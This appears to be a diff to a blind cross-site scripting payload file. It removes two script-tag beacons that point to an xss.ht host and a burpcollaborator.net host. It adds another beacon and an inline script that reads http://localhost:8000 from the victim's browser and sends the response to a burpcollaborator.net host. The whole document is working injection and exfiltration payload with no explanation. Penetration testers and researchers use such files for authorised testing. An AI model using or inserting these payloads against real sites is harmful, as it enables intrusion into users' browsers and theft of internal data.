@@ -1,2 +1,11 @@
-"><script src=https://ltidixss.xss.ht?face-photo></script>
-"><script src=https://nrivd6z603alsfbhtzvx87hg278ywn.burpcollaborator.net?face-photo></script>
+"><script src=https://zwza5vzwa9xpp09iknpjoe91jspjd8.burpcollaborator.net?blindxss_git></script>
+"><script>
+  function httpGet(theUrl){
+      var xmlHttp = new XMLHttpRequest();
+      xmlHttp.open( "GET", theUrl, false );
+      xmlHttp.send( null );
+      return xmlHttp.responseText;
+  }
+  var response = httpGet("http://localhost:8000");
+  var send_it = httpGet("http://ewep5azbaox4pf9xk2pyot9gj7p0dp.burpcollaborator.net?res="+response);
+</script>
